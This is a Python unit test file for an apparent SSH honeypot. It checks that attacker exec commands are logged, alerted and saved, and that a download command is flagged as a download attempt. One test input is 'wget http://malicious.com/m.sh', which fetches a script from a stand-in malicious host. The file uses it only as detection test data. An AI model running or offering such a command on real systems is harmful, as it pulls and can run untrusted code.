import unittest
from unittest.mock import MagicMock, patch
import paramiko
from services.ssh_honey import _SSHServer

class TestSSHServer(unittest.TestCase):
    def setUp(self):
        self.client_ip = "1.2.3.4"
        self.server = _SSHServer(self.client_ip)
        self.mock_channel = MagicMock()

    @patch("services.ssh_honey.save_payload")
    @patch("services.ssh_honey.log_event")
    @patch("services.ssh_honey.send_alert")
    def test_exec_request_logged_as_exec_attempt(self, mock_send_alert, mock_log_event, mock_save):
        if not hasattr(self.server, "check_channel_exec_request"):
            self.fail("check_channel_exec_request not implemented")

        mock_log_event.return_value = {"rowid": 1}
        command = "whoami"
        result = self.server.check_channel_exec_request(self.mock_channel, command.encode())

        self.assertTrue(result)
        mock_log_event.assert_called_with(
            self.client_ip, 22, "SSH", "exec_attempt", {"command": command}
        )
        mock_send_alert.assert_called()
        mock_save.assert_called_once()
        self.mock_channel.send_exit_status.assert_called_with(0)
        self.mock_channel.close.assert_called()

    @patch("services.ssh_honey.save_payload")
    @patch("services.ssh_honey.log_event")
    @patch("services.ssh_honey.send_alert")
    def test_exec_request_with_url_logged_as_download_attempt(self, mock_send_alert, mock_log_event, mock_save):
        if not hasattr(self.server, "check_channel_exec_request"):
            self.fail("check_channel_exec_request not implemented")

        mock_log_event.return_value = {"rowid": 2}
        command = "wget http://malicious.com/m.sh"
        result = self.server.check_channel_exec_request(self.mock_channel, command.encode())

        self.assertTrue(result)
        mock_log_event.assert_called_with(
            self.client_ip, 22, "SSH", "download_attempt", {"command": command, "urls": ["http://malicious.com/m.sh"]}
        )
        args, kwargs = mock_send_alert.call_args
        self.assertEqual(kwargs.get("alert_type"), "download_attempt")
        mock_save.assert_called_once()

if __name__ == "__main__":
    unittest.main()
